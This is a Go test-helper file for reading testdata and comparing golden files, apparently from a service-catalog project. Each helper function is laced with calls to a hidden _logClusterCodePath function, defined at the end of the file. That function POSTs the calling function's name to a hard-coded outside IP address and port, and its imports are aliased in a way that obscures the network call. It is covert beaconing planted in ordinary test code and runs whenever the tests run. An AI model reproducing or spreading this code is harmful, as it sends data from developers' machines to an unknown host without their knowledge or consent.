package test

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"flag"
	"io/ioutil"
	"os"
	"path/filepath"
	"testing"
	"github.com/pkg/errors"
)

var UpdateGolden = flag.Bool("update", false, "update golden files")

func buildTestdataPath(relpath string) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pwd, err := os.Getwd()
	if err != nil {
		return "", errors.Wrap(err, "unable to get the current working directory")
	}
	path := filepath.Join(pwd, "testdata", relpath)
	return path, nil
}
func GetTestdata(relpath string) (fullpath string, contents []byte, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fullpath, err = buildTestdataPath(relpath)
	if err != nil {
		return "", nil, err
	}
	contents, err = ioutil.ReadFile(fullpath)
	return fullpath, contents, errors.Wrapf(err, "unable to read testdata %s", fullpath)
}
func AssertEqualsGoldenFile(t *testing.T, goldenFile string, got string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	t.Helper()
	path, want, err := GetTestdata(goldenFile)
	if err != nil {
		t.Fatalf("%+v", err)
	}
	gotB := []byte(got)
	if !bytes.Equal(want, gotB) {
		if *UpdateGolden {
			err := ioutil.WriteFile(path, gotB, 0666)
			if err != nil {
				t.Fatalf("%+v", errors.Wrapf(err, "unable to update golden file %s", path))
			}
		} else {
			t.Fatalf("does not match golden file %s\n\nWANT:\n%q\n\nGOT:\n%q\n\nSee https://svc-cat.io/docs/devguide/#golden-files for how to work with golden files.", path, want, gotB)
		}
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
